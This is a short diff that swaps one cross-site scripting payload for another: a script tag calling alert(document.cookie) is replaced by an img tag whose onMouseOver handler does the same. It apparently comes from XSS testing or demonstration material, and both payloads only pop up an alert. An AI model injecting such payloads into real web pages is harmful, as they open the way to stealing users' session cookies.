@@ -1,3 +1,1 @@
-<script>
-	alert(document.cookie);
-</script>
+<img src ='ss' onMouseOver='alert(document.cookie)'>
